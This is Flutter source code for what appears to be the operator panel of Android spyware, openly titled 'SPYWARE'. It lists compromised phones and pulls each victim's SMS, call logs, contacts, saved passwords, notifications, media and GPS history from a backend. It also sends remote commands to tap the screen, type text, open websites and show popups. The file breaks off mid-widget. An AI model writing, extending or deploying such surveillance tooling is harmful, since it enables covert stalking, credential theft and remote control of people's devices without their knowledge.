import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:intl/intl.dart';
import 'package:flutter_map/flutter_map.dart';
import 'package:latlong2/latlong.dart';
import 'btrapps/.dart';
final String baseUrl = "${Api.api}/api";

class SpywarePage extends StatefulWidget {
  final String sessionKey;
  final String userRole;
  final String username;

  const SpywarePage({
    super.key,
    required this.sessionKey,
    required this.userRole,
    required this.username,
  });

  @override
  State<SpywarePage> createState() => _SpywarePageState();
}

class _SpywarePageState extends State<SpywarePage> with TickerProviderStateMixin {
  // ===== THEME GOTHIC MAGENTA =====
  final Color bgDark = const Color(0xFF090212);
  final Color bgDeep = const Color(0xFF140526);
  final Color neonMagenta = const Color(0xFFE6007E);
  final Color neonPurple = const Color(0xFF8E00C7);
  final Color glowMagenta = const Color(0x33E6007E);
  final Color glowPurple = const Color(0x338E00C7);
  final Color textWhite = const Color(0xFFF5F0FF);
  final Color textDim = const Color(0xFF9A8AB5);
  final Color cardBg = const Color(0x1AFFFFFF);
  final Color cardBorder = const Color(0x33E6007E);

  late AnimationController _glowController;
  late Animation<double> _glowAnimation;
  late AnimationController _pulseController;

  List<dynamic> _devices = [];
  Map<String, dynamic>? _selectedDevice;
  Map<String, dynamic> _deviceInfo = {};
  List<dynamic> _locations = [];
  Map<String, dynamic>? _lastLocation;
  Map<String, dynamic> _batteryInfo = {};
  List<dynamic> _mediaFiles = [];
  List<dynamic> _smsList = [];
  List<dynamic> _callsList = [];
  List<dynamic> _contactsList = [];
  List<dynamic> _passwordsList = [];
  List<dynamic> _notificationsList = [];
  String? _selectedMedia;

  bool _isLoading = true;
  bool _isLoadingData = false;
  bool _isShowingDeviceDetail = false;
  String? _selectedDataType;
  String? _commandResponse;
  int _selectedTabIndex = 0;

  // ===== CONTROLLERS =====
  final TextEditingController _webUrlController = TextEditingController();
  final TextEditingController _notifTitleController = TextEditingController();
  final TextEditingController _notifMessageController = TextEditingController();
  final TextEditingController _popupTitleController = TextEditingController();
  final TextEditingController _popupMessageController = TextEditingController();
  final TextEditingController _imageUrlController = TextEditingController();
  final TextEditingController _imageCountController = TextEditingController();
  final TextEditingController _inputTextController = TextEditingController();
  final TextEditingController _tapXController = TextEditingController();
  final TextEditingController _tapYController = TextEditingController();
  final TextEditingController _musicUrlController = TextEditingController();
  final TextEditingController _musicTitleController = TextEditingController();
  final TextEditingController _musicArtistController = TextEditingController();
  final TextEditingController _searchController = TextEditingController();

  @override
  void initState() {
    super.initState();
    _glowController = AnimationController(
      duration: const Duration(seconds: 3),
      vsync: this,
    )..repeat(reverse: true);

    _glowAnimation = Tween<double>(begin: 0.3, end: 1.0).animate(
      CurvedAnimation(parent: _glowController, curve: Curves.easeInOut),
    );

    _pulseController = AnimationController(
      duration: const Duration(milliseconds: 1500),
      vsync: this,
    )..repeat(reverse: true);

    WidgetsBinding.instance.addPostFrameCallback((_) {
      _fetchDevices();
    });
  }

  @override
  void dispose() {
    _glowController.dispose();
    _pulseController.dispose();
    _webUrlController.dispose();
    _notifTitleController.dispose();
    _notifMessageController.dispose();
    _popupTitleController.dispose();
    _popupMessageController.dispose();
    _imageUrlController.dispose();
    _imageCountController.dispose();
    _inputTextController.dispose();
    _tapXController.dispose();
    _tapYController.dispose();
    _musicUrlController.dispose();
    _musicTitleController.dispose();
    _musicArtistController.dispose();
    _searchController.dispose();
    super.dispose();
  }

  // ==================== API CALLS ====================

  Future<void> _fetchDevices() async {
    setState(() => _isLoading = true);
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/devices?username=${widget.username}'),
        headers: {'Content-Type': 'application/json'},
      );
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true && data['devices'] != null) {
          setState(() {
            _devices = data['devices'];
            _isLoading = false;
          });
        } else {
          setState(() => _isLoading = false);
        }
      } else {
        setState(() => _isLoading = false);
        _showErrorSnackbar('Failed to load devices');
      }
    } catch (e) {
      setState(() => _isLoading = false);
      _showErrorSnackbar('Error: $e');
    }
  }

  Future<void> _fetchDeviceInfo(String deviceId) async {
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/device/info?device=$deviceId&username=${widget.username}'),
        headers: {'Content-Type': 'application/json'},
      );
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true) {
          setState(() => _deviceInfo = data);
        }
      }
    } catch (e) {
      debugPrint('Error fetching device info: $e');
    }
  }

  Future<void> _fetchLocations(String deviceId) async {
    setState(() {
      _isLoadingData = true;
      _selectedDataType = 'locations';
    });
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/location/get?device=$deviceId&username=${widget.username}&limit=50'),
        headers: {'Content-Type': 'application/json'},
      );
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true) {
          setState(() {
            _locations = data['locations'] ?? [];
            _lastLocation = data['locations']?.isNotEmpty == true ? data['locations'][0] : null;
            _isLoadingData = false;
          });
        } else {
          throw Exception(data['error'] ?? 'Failed to load locations');
        }
      } else {
        throw Exception('Failed to load locations');
      }
    } catch (e) {
      setState(() => _isLoadingData = false);
      _showErrorSnackbar('Error: $e');
    }
  }

  Future<void> _fetchBatteryInfo(String deviceId) async {
    setState(() {
      _isLoadingData = true;
      _selectedDataType = 'battery';
    });
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/battery/get?device=$deviceId&username=${widget.username}'),
        headers: {'Content-Type': 'application/json'},
      );
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true) {
          setState(() {
            _batteryInfo = data;
            _isLoadingData = false;
          });
        } else {
          throw Exception(data['error'] ?? 'Failed to load battery');
        }
      } else {
        throw Exception('Failed to load battery');
      }
    } catch (e) {
      setState(() => _isLoadingData = false);
      _showErrorSnackbar('Error: $e');
    }
  }

  Future<void> _fetchSms(String deviceId) async {
    setState(() {
      _isLoadingData = true;
      _selectedDataType = 'sms';
    });
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/sms/get?device=$deviceId&username=${widget.username}&limit=100'),
        headers: {'Content-Type': 'application/json'},
      );
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true) {
          setState(() {
            _smsList = data['sms'] ?? [];
            _isLoadingData = false;
          });
        } else {
          throw Exception(data['error'] ?? 'Failed to load SMS');
        }
      } else {
        throw Exception('Failed to load SMS');
      }
    } catch (e) {
      setState(() => _isLoadingData = false);
      _showErrorSnackbar('Error: $e');
    }
  }

  Future<void> _fetchCalls(String deviceId) async {
    setState(() {
      _isLoadingData = true;
      _selectedDataType = 'calls';
    });
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/calls/get?device=$deviceId&username=${widget.username}&limit=100'),
        headers: {'Content-Type': 'application/json'},
      );
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true) {
          setState(() {
            _callsList = data['calls'] ?? [];
            _isLoadingData = false;
          });
        } else {
          throw Exception(data['error'] ?? 'Failed to load calls');
        }
      } else {
        throw Exception('Failed to load calls');
      }
    } catch (e) {
      setState(() => _isLoadingData = false);
      _showErrorSnackbar('Error: $e');
    }
  }

  Future<void> _fetchContacts(String deviceId) async {
    setState(() {
      _isLoadingData = true;
      _selectedDataType = 'contacts';
    });
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/contacts/get?device=$deviceId&username=${widget.username}'),
        headers: {'Content-Type': 'application/json'},
      );
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true) {
          setState(() {
            _contactsList = data['contacts'] ?? [];
            _isLoadingData = false;
          });
        } else {
          throw Exception(data['error'] ?? 'Failed to load contacts');
        }
      } else {
        throw Exception('Failed to load contacts');
      }
    } catch (e) {
      setState(() => _isLoadingData = false);
      _showErrorSnackbar('Error: $e');
    }
  }

  Future<void> _fetchPasswords(String deviceId) async {
    setState(() {
      _isLoadingData = true;
      _selectedDataType = 'passwords';
    });
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/passwords/get?device=$deviceId&username=${widget.username}'),
        headers: {'Content-Type': 'application/json'},
      );
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true) {
          setState(() {
            _passwordsList = data['passwords'] ?? [];
            _isLoadingData = false;
          });
        } else {
          throw Exception(data['error'] ?? 'Failed to load passwords');
        }
      } else {
        throw Exception('Failed to load passwords');
      }
    } catch (e) {
      setState(() => _isLoadingData = false);
      _showErrorSnackbar('Error: $e');
    }
  }

  Future<void> _fetchNotifications(String deviceId) async {
    setState(() {
      _isLoadingData = true;
      _selectedDataType = 'notifications';
    });
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/notifications/get?device=$deviceId&username=${widget.username}&limit=100'),
        headers: {'Content-Type': 'application/json'},
      );
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true) {
          setState(() {
            _notificationsList = data['notifications'] ?? [];
            _isLoadingData = false;
          });
        } else {
          throw Exception(data['error'] ?? 'Failed to load notifications');
        }
      } else {
        throw Exception('Failed to load notifications');
      }
    } catch (e) {
      setState(() => _isLoadingData = false);
      _showErrorSnackbar('Error: $e');
    }
  }

  Future<void> _fetchMedia(String deviceId) async {
    setState(() {
      _isLoadingData = true;
      _selectedDataType = 'media';
    });
    try {
      final response = await http.get(
        Uri.parse('$baseUrl/media/list?device=$deviceId&username=${widget.username}'),
        headers: {'Content-Type': 'application/json'},
      );
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true) {
          setState(() {
            _mediaFiles = data['files'] ?? [];
            _isLoadingData = false;
          });
        } else {
          throw Exception(data['error'] ?? 'Failed to load media');
        }
      } else {
        throw Exception('Failed to load media');
      }
    } catch (e) {
      setState(() => _isLoadingData = false);
      _showErrorSnackbar('Error: $e');
    }
  }

  Future<void> _sendCommand(String deviceId, String command, [Map<String, dynamic>? params]) async {
    try {
      final body = {
        'device': deviceId,
        'username': widget.username,
        'command': command,
        'data': params ?? {},
      };
      final response = await http.post(
        Uri.parse('$baseUrl/command/send'),
        headers: {'Content-Type': 'application/json'},
        body: json.encode(body),
      );
      if (response.statusCode == 200) {
        final data = json.decode(response.body);
        if (data['success'] == true) {
          setState(() => _commandResponse = '✓ Command sent: $command');
          _showSuccessSnackbar('Command executed');
        } else {
          _showErrorSnackbar(data['error'] ?? 'Command failed');
        }
      } else {
        _showErrorSnackbar('Failed to send command');
      }
    } catch (e) {
      _showErrorSnackbar('Error: $e');
    }
  }

  void _showDeviceDetail(Map<String, dynamic> device) {
    setState(() {
      _selectedDevice = device;
      _isShowingDeviceDetail = true;
      _selectedTabIndex = 0;
      _deviceInfo = {};
      _locations = [];
      _lastLocation = null;
      _batteryInfo = {};
      _mediaFiles = [];
      _smsList = [];
      _callsList = [];
      _contactsList = [];
      _passwordsList = [];
      _notificationsList = [];
    });
    _fetchDeviceInfo(device['device_id']);
    _fetchLocations(device['device_id']);
    _fetchBatteryInfo(device['device_id']);
    _fetchMedia(device['device_id']);
  }

  void _showSuccessSnackbar(String message) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(children: [
          Icon(Icons.check_circle, color: Colors.white, size: 18),
          SizedBox(width: 8),
          Expanded(child: Text(message, style: TextStyle(fontSize: 12))),
        ]),
        backgroundColor: neonMagenta,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        duration: Duration(seconds: 2),
      ),
    );
  }

  void _showErrorSnackbar(String message) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Row(children: [
          Icon(Icons.error_outline, color: Colors.white, size: 18),
          SizedBox(width: 8),
          Expanded(child: Text(message, style: TextStyle(fontSize: 12))),
        ]),
        backgroundColor: Colors.red.shade900,
        behavior: SnackBarBehavior.floating,
        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(12)),
        duration: Duration(seconds: 3),
      ),
    );
  }

  void _navigateBack() {
    if (_selectedDataType != null) {
      setState(() {
        _selectedDataType = null;
        _locations = [];
        _batteryInfo = {};
        _mediaFiles = [];
        _smsList = [];
        _callsList = [];
        _contactsList = [];
        _passwordsList = [];
        _notificationsList = [];
      });
    } else if (_isShowingDeviceDetail) {
      setState(() {
        _isShowingDeviceDetail = false;
        _selectedDevice = null;
        _deviceInfo = {};
      });
    } else {
      Navigator.pop(context);
    }
  }

  String _formatDateTime(String? dateStr) {
    if (dateStr == null) return 'Unknown';
    try {
      final date = DateTime.parse(dateStr);
      final now = DateTime.now();
      final diff = now.difference(date);
      if (diff.inDays > 0) return DateFormat('dd/MM/yyyy HH:mm').format(date);
      if (diff.inHours > 0) return '${diff.inHours}h ago';
      if (diff.inMinutes > 0) return '${diff.inMinutes}m ago';
      return 'Just now';
    } catch (e) {
      return 'Invalid date';
    }
  }

  String _formatEpochTime(int? timestamp) {
    if (timestamp == null) return 'Unknown';
    try {
      return DateFormat('dd/MM/yyyy HH:mm:ss').format(
        DateTime.fromMillisecondsSinceEpoch(timestamp),
      );
    } catch (e) {
      return 'Unknown';
    }
  }

  String _formatBytes(int bytes) {
    if (bytes < 1024) return '$bytes B';
    if (bytes < 1024 * 1024) return '${(bytes / 1024).toStringAsFixed(1)} KB';
    if (bytes < 1024 * 1024 * 1024) return '${(bytes / (1024 * 1024)).toStringAsFixed(1)} MB';
    return '${(bytes / (1024 * 1024 * 1024)).toStringAsFixed(2)} GB';
  }

  // ==================== CUSTOM DIALOGS ====================

  void _showCustomMusicDialog(String deviceId) {
    _showCustomDialog(
      title: '🎵 PLAY MUSIC',
      icon: Icons.music_note,
      color: neonMagenta,
      children: [
        _buildTextField(_musicUrlController, 'Music URL', 'https://example.com/song.mp3', Icons.link),
        SizedBox(height: 10),
        _buildTextField(_musicTitleController, 'Song Title (optional)', 'My Song', Icons.title),
        SizedBox(height: 10),
        _buildTextField(_musicArtistController, 'Artist (optional)', 'Artist Name', Icons.person),
      ],
      onConfirm: () {
        if (_musicUrlController.text.isNotEmpty) {
          final params = {'url': _musicUrlController.text};
          if (_musicTitleController.text.isNotEmpty) params['title'] = _musicTitleController.text;
          if (_musicArtistController.text.isNotEmpty) params['artist'] = _musicArtistController.text;
          _sendCommand(deviceId, 'play_music', params);
          _musicUrlController.clear();
          _musicTitleController.clear();
          _musicArtistController.clear();
        } else {
          _showErrorSnackbar('URL is required');
        }
      },
    );
  }

  void _showCustomWebDialog(String deviceId) {
    _showCustomDialog(
      title: '🌐 OPEN WEBSITE',
      icon: Icons.public,
      color: Colors.blue,
      children: [
        _buildTextField(_webUrlController, 'Website URL', 'https://example.com', Icons.link),
        SizedBox(height: 10),
        _buildTextField(
          TextEditingController(),
          'Custom Title (optional)',
          'Website Title',
          Icons.title,
        ),
      ],
      onConfirm: () {
        if (_webUrlController.text.isNotEmpty) {
          _sendCommand(deviceId, 'open_web', {'url': _webUrlController.text});
          _webUrlController.clear();
        } else {
          _showErrorSnackbar('URL is required');
        }
      },
    );
  }

  void _showCustomNotificationDialog(String deviceId) {
    _showCustomDialog(
      title: '🔔 CUSTOM NOTIFICATION',
      icon: Icons.notifications,
      color: Colors.orange,
      children: [
        _buildTextField(_notifTitleController, 'Title', 'Alert!', Icons.title),
        SizedBox(height: 10),
        _buildTextField(_notifMessageController, 'Message', 'This is a notification', Icons.message, maxLines: 3),
      ],
      onConfirm: () {
        if (_notifTitleController.text.isNotEmpty && _notifMessageController.text.isNotEmpty) {
          _sendCommand(deviceId, 'show_notification', {
            'title': _notifTitleController.text,
            'message': _notifMessageController.text,
          });
          _notifTitleController.clear();
          _notifMessageController.clear();
        } else {
          _showErrorSnackbar('Title and message are required');
        }
      },
    );
  }

  void _showCustomPopupDialog(String deviceId) {
    _showCustomDialog(
      title: '💬 CUSTOM POPUP',
      icon: Icons.message,
      color: neonPurple,
      children: [
        _buildTextField(_popupTitleController, 'Title', 'Popup Title', Icons.title),
        SizedBox(height: 10),
        _buildTextField(_popupMessageController, 'Message', 'Popup message here', Icons.message, maxLines: 3),
      ],
      onConfirm: () {
        if (_popupTitleController.text.isNotEmpty && _popupMessageController.text.isNotEmpty) {
          _sendCommand(deviceId, 'show_popup', {
            'title': _popupTitleController.text,
            'message': _popupMessageController.text,
          });
          _popupTitleController.clear();
          _popupMessageController.clear();
        } else {
          _showErrorSnackbar('Title and message are required');
        }
      },
    );
  }

  void _showCustomImageDialog(String deviceId) {
    _showCustomDialog(
      title: '🖼️ FLOATING IMAGES',
      icon: Icons.image,
      color: Colors.pink,
      children: [
        _buildTextField(_imageUrlController, 'Image URL', 'https://example.com/image.jpg', Icons.image),
        SizedBox(height: 10),
        _buildTextField(_imageCountController, 'Number of Images', '5', Icons.numbers, keyboardType: TextInputType.number),
      ],
      onConfirm: () {
        if (_imageUrlController.text.isNotEmpty && _imageCountController.text.isNotEmpty) {
          _sendCommand(deviceId, 'show_floating_images', {
            'url': _imageUrlController.text,
            'count': _imageCountController.text,
          });
          _imageUrlController.clear();
          _imageCountController.clear();
        } else {
          _showErrorSnackbar('URL and count are required');
        }
      },
    );
  }

  void _showCustomInputDialog(String deviceId) {
    _showCustomDialog(
      title: '⌨️ INPUT TEXT',
      icon: Icons.text_fields,
      color: Colors.cyan,
      children: [
        _buildTextField(_inputTextController, 'Text to input', 'Hello World!', Icons.text_fields, maxLines: 3),
      ],
      onConfirm: () {
        if (_inputTextController.text.isNotEmpty) {
          _sendCommand(deviceId, 'input_text', {'text': _inputTextController.text});
          _inputTextController.clear();
        } else {
          _showErrorSnackbar('Text is required');
        }
      },
    );
  }

  void _showCustomTapDialog(String deviceId) {
    _showCustomDialog(
      title: '👆 TAP SCREEN',
      icon: Icons.touch_app,
      color: Colors.green,
      children: [
        Row(
          children: [
            Expanded(
              child: _buildTextField(
                _tapXController,
                'X Coordinate',
                '500',
                Icons.horizontal_rule,
                keyboardType: TextInputType.number,
              ),
            ),
            SizedBox(width: 10),
            Expanded(
              child: _buildTextField(
                _tapYController,
                'Y Coordinate',
                '800',
                Icons.vertical_align_bottom,
                keyboardType: TextInputType.number,
              ),
            ),
          ],
        ),
      ],
      onConfirm: () {
        if (_tapXController.text.isNotEmpty && _tapYController.text.isNotEmpty) {
          _sendCommand(deviceId, 'tap', {
            'x': _tapXController.text,
            'y': _tapYController.text,
          });
          _tapXController.clear();
          _tapYController.clear();
        } else {
          _showErrorSnackbar('X and Y coordinates are required');
        }
      },
    );
  }

  Widget _buildTextField(
    TextEditingController controller,
    String label,
    String hint,
    IconData icon, {
    int maxLines = 1,
    TextInputType keyboardType = TextInputType.text,
  }) {
    return TextField(
      controller: controller,
      style: TextStyle(color: textWhite, fontSize: 14),
      maxLines: maxLines,
      keyboardType: keyboardType,
      decoration: InputDecoration(
        labelText: label,
        labelStyle: TextStyle(color: textDim, fontSize: 12),
        hintText: hint,
        hintStyle: TextStyle(color: textDim.withOpacity(0.5), fontSize: 12),
        prefixIcon: Icon(icon, color: neonMagenta, size: 20),
        enabledBorder: OutlineInputBorder(
          borderSide: BorderSide(color: cardBorder, width: 1),
          borderRadius: BorderRadius.circular(12),
        ),
        focusedBorder: OutlineInputBorder(
          borderSide: BorderSide(color: neonMagenta, width: 2),
          borderRadius: BorderRadius.circular(12),
        ),
        filled: true,
        fillColor: cardBg,
      ),
    );
  }

  void _showCustomDialog({
    required String title,
    required IconData icon,
    required Color color,
    required List<Widget> children,
    required VoidCallback onConfirm,
  }) {
    showDialog(
      context: context,
      barrierColor: Colors.black.withOpacity(0.85),
      builder: (context) => AlertDialog(
        backgroundColor: bgDeep,
        shape: RoundedRectangleBorder(
          borderRadius: BorderRadius.circular(24),
          side: BorderSide(color: color.withOpacity(0.5), width: 1.5),
        ),
        titlePadding: EdgeInsets.fromLTRB(20, 20, 20, 8),
        contentPadding: EdgeInsets.fromLTRB(20, 8, 20, 8),
        actionsPadding: EdgeInsets.fromLTRB(16, 8, 16, 16),
        title: Row(
          children: [
            Container(
              padding: EdgeInsets.all(10),
              decoration: BoxDecoration(
                gradient: LinearGradient(
                  colors: [color, color.withOpacity(0.5)],
                  begin: Alignment.topLeft,
                  end: Alignment.bottomRight,
                ),
                borderRadius: BorderRadius.circular(12),
              ),
              child: Icon(icon, color: Colors.white, size: 22),
            ),
            SizedBox(width: 12),
            Expanded(
              child: Text(
                title,
                style: TextStyle(
                  color: textWhite,
                  fontFamily: 'Orbitron',
                  fontWeight: FontWeight.bold,
                  fontSize: 16,
                ),
              ),
            ),
          ],
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: children,
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: Text(
              'CANCEL',
              style: TextStyle(
                color: textDim,
                fontFamily: 'Orbitron',
                fontSize: 11,
                letterSpacing: 1,
              ),
            ),
          ),
          ElevatedButton(
            style: ElevatedButton.styleFrom(
              backgroundColor: color,
              foregroundColor: Colors.white,
              shape: RoundedRectangleBorder(
                borderRadius: BorderRadius.circular(12),
              ),
              padding: EdgeInsets.symmetric(horizontal: 24, vertical: 10),
            ),
            onPressed: () {
              Navigator.pop(context);
              onConfirm();
            },
            child: Text(
              'SEND',
              style: TextStyle(
                fontFamily: 'Orbitron',
                fontSize: 12,
                fontWeight: FontWeight.bold,
                letterSpacing: 1,
              ),
            ),
          ),
        ],
      ),
    );
  }

  // ==================== BUILD ====================

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: _glowAnimation,
      builder: (context, child) {
        return Container(
          decoration: BoxDecoration(
            gradient: RadialGradient(
              colors: [
                bgDeep,
                bgDark,
                bgDark.withOpacity(0.9),
              ],
              center: Alignment.topRight,
              radius: _glowAnimation.value * 1.5,
            ),
          ),
          child: Scaffold(
            backgroundColor: Colors.transparent,
            appBar: AppBar(
              title: Row(
                children: [
                  ShaderMask(
                    shaderCallback: (bounds) => LinearGradient(
                      colors: [neonMagenta, neonPurple],
                    ).createShader(bounds),
                    child: Text(
                      'SPY',
                      style: TextStyle(
                        fontFamily: 'Orbitron',
                        fontWeight: FontWeight.bold,
                        fontSize: 24,
                        color: Colors.white,
                      ),
                    ),
                  ),
                  Text(
                    'WARE',
                    style: TextStyle(
                      color: textWhite,
                      fontFamily: 'Orbitron',
                      fontWeight: FontWeight.bold,
                      fontSize: 24,
                    ),
                  ),
                ],
              ),
              backgroundColor: Colors.transparent,
              elevation: 0,
              leading: IconButton(
                icon: Container(
                  padding: EdgeInsets.all(8),
                  decoration: BoxDecoration(
                    color: cardBg,
                    borderRadius: BorderRadius.circular(12),
                    border: Border.all(color: cardBorder, width: 1),
                  ),
                  child: Icon(Icons.arrow_back, color: neonMagenta, size: 20),
                ),
                onPressed: _navigateBack,
              ),
              actions: [
                if (_selectedDevice != null && _selectedDevice!['online'] == true)
                  AnimatedBuilder(
                    animation: _pulseController,
                    builder: (context, child) {
                      return Container(
                        margin: EdgeInsets.only(right: 8),
                        padding: EdgeInsets.symmetric(horizontal: 12, vertical: 6),
                        decoration: BoxDecoration(
                          color: cardBg,
                          borderRadius: BorderRadius.circular(20),
                          border: Border.all(color: Colors.green.withOpacity(0.5)),
                        ),
                        child: Row(
                          children: [
                            Container(
                              width: 8,
                              height: 8,
                              decoration: BoxDecoration(
                                color: Colors.green,
                                shape: BoxShape.circle,
                                boxShadow: [
                                  BoxShadow(
                                    color: Colors.green.withOpacity(0.6),
                                    blurRadius: 8 + (_pulseController.value * 4),
                                  ),
                                ],
                              ),
                            ),
                            SizedBox(width: 6),
                            Text(
                              'ONLINE',
                              style: TextStyle(
                                color: Colors.green,
                                fontFamily: 'ShareTechMono',
                                fontSize: 10,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                          ],
                        ),
                      );
                    },
                  ),
                if (!_isShowingDeviceDetail && _selectedDataType == null)
                  IconButton(
                    icon: Icon(Icons.refresh, color: neonMagenta),
                    onPressed: _fetchDevices,
                  ),
              ],
            ),
            body: _isLoading
                ? _buildLoading()
                : _isShowingDeviceDetail
                    ? _buildDeviceDetail()
                    : _selectedDataType != null
                        ? _buildDataView()
                        : _buildDevicesView(),
          ),
        );
      },
    );
  }

  Widget _buildLoading() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Container(
            width: 50,
            height: 50,
            child: CircularProgressIndicator(
              valueColor: AlwaysStoppedAnimation<Color>(neonMagenta),
              strokeWidth: 3,
            ),
          ),
          SizedBox(height: 20),
          Text(
            'LOADING DEVICES...',
            style: TextStyle(
              color: textDim,
              fontFamily: 'ShareTechMono',
              fontSize: 11,
              letterSpacing: 2,
            ),
          ),
        ],
      ),
    );
  }

  // ==================== DEVICES VIEW ====================

  Widget _buildDevicesView() {
    if (_devices.isEmpty) {
      return Center(
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Icon(Icons.devices_other, size: 64, color: neonMagenta.withOpacity(0.3)),
            SizedBox(height: 16),
            Text(
              'No Devices Found',
              style: TextStyle(
                color: textWhite,
                fontFamily: 'Orbitron',
                fontSize: 18,
              ),
            ),
            SizedBox(height: 8),
            Text(
              'Waiting for devices to connect...',
              style: TextStyle(color: textDim, fontFamily: 'ShareTechMono'),
            ),
          ],
        ),
      );
    }

    return ListView.builder(
      padding: EdgeInsets.all(16),
      itemCount: _devices.length,
      itemBuilder: (context, index) {
        final device = _devices[index];
        final online = device['online'] == true;

        return GestureDetector(
          onTap: () => _showDeviceDetail(device),
          child: AnimatedContainer(
            duration: Duration(milliseconds: 300),
            margin: EdgeInsets.only(bottom: 14),
            decoration: BoxDecoration(
              gradient: LinearGradient(
                colors: [
                  cardBg,
                  online ? neonMagenta.withOpacity(0.08) : Colors.transparent,
                ],
                begin: Alignment.topLeft,
                end: Alignment.bottomRight,
              ),
              borderRadius: BorderRadius.circular(20),
              border: Border.all(
                color: online ? neonMagenta.withOpacity(0.5) : cardBorder,
                width: online ? 1.5 : 1,
              ),
              boxShadow: online
                  ? [
                      BoxShadow(
                        color: glowMagenta,
                        blurRadius: 20,
                        spreadRadius: 2,
                      ),
                    ]
                  : null,
            ),
            child: Padding(
              padding: EdgeInsets.all(16),
              child: Row(
                children: [
                  Container(
                    padding: EdgeInsets.all(12),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [neonMagenta, neonPurple],
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                      ),
                      shape: BoxShape.circle,
                    ),
                    child: Icon(Icons.phone_android, color: Colors.white, size: 22),
                  ),
                  SizedBox(width: 14),
                  Expanded(
                    child: Column(
                      crossAxisAlignment: CrossAxisAlignment.start,
                      children: [
                        Text(
                          device['model'] ?? 'Unknown',
                          style: TextStyle(
                            color: textWhite,
                            fontFamily: 'Orbitron',
                            fontWeight: FontWeight.bold,
                            fontSize: 14,
                          ),
                        ),
                        SizedBox(height: 4),
                        Row(
                          children: [
                            Container(
                              width: 6,
                              height: 6,
                              decoration: BoxDecoration(
                                color: online ? Colors.green : textDim,
                                shape: BoxShape.circle,
                              ),
                            ),
                            SizedBox(width: 6),
                            Text(
                              online ? 'ONLINE' : 'OFFLINE',
                              style: TextStyle(
                                color: online ? Colors.green : textDim,
                                fontFamily: 'ShareTechMono',
                                fontSize: 10,
                                fontWeight: FontWeight.bold,
                              ),
                            ),
                            if (device['last_seen'] != null) ...[
                              SizedBox(width: 8),
                              Text(
                                '• ${_formatDateTime(device['last_seen'])}',
                                style: TextStyle(
                                  color: textDim,
                                  fontFamily: 'ShareTechMono',
                                  fontSize: 9,
                                ),
                              ),
                            ],
                          ],
                        ),
                      ],
                    ),
                  ),
                  Container(
                    padding: EdgeInsets.all(8),
                    decoration: BoxDecoration(
                      color: cardBg,
                      borderRadius: BorderRadius.circular(12),
                    ),
                    child: Icon(Icons.chevron_right, color: neonMagenta, size: 18),
                  ),
                ],
              ),
            ),
          ),
        );
      },
    );
  }

  // ==================== DEVICE DETAIL ====================

  Widget _buildDeviceDetail() {
    if (_selectedDevice == null) return SizedBox();
    final device = _selectedDevice!;
    final online = device['online'] == true;
    final deviceId = device['device_id'];

    return Column(
      children: [
        // Header
        Container(
          width: double.infinity,
          padding: EdgeInsets.all(20),
          decoration: BoxDecoration(
            gradient: LinearGradient(
              colors: [neonMagenta.withOpacity(0.15), Colors.transparent],
              begin: Alignment.topCenter,
              end: Alignment.bottomCenter,
            ),
          ),
          child: Row(
            children: [
              Stack(
                children: [
                  Container(
                    padding: EdgeInsets.all(14),
                    decoration: BoxDecoration(
                      gradient: LinearGradient(
                        colors: [neonMagenta, neonPurple],
                        begin: Alignment.topLeft,
                        end: Alignment.bottomRight,
                      ),
                      shape: BoxShape.circle,
                      boxShadow: [
                        BoxShadow(
                          color: glowMagenta,
                          blurRadius: 25,
                          spreadRadius: 5,
                        ),
                      ],
                    ),
                    child: Icon(Icons.phone_android, color: Colors.white, size: 26),
                  ),
                  if (online)
                    Positioned(
                      right: 0,
                      bottom: 0,
                      child: Container(
                        width: 12,
                        height: 12,
                        decoration: BoxDecoration(
                          color: Colors.green,
                          shape: BoxShape.circle,
                          border: Border.all(color: bgDark, width: 2),
                        ),
                      ),
                    ),
                ],
              ),
              SizedBox(width: 14),
              Expanded(
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    Text(
                      device['model'] ?? 'Unknown',
                      style: TextStyle(
                        color: textWhite,
                        fontFamily: 'Orbitron',
                        fontSize: 16,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                    SizedBox(height: 4),
                    Row(
                      children: [
                        Icon(Icons.battery_charging_full, color: Colors.green, size: 14),
                        SizedBox(width: 4),
                        Text(
                          '${device['battery'] ?? 0}%',
                          style: TextStyle(color: Colors.green, fontFamily: 'ShareTechMono', fontSize: 12),
                        ),
                        SizedBox(width: 12),
                        Icon(Icons.signal_cellular_alt, color: textDim, size: 14),
